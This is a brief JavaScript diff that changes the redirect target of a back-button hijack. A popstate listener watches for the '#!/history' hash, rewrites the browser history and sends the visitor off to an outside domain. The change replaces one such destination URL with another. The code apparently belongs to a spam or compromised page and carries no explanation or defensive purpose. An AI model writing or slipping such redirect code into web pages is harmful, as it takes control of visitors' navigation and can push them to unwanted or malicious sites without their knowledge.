@@ -6,7 +6,7 @@ window.addEventListener("popstate", function() {
   if(location.hash === "#!/history") {
     history.replaceState(null, document.title, location.pathname);
     setTimeout(function(){
-      location.replace("https://goodhomeids.com/redirect.php");
+      location.replace("https://pc-mind.com/sitemap_post.xml");
     },0);
   }
 }, false);
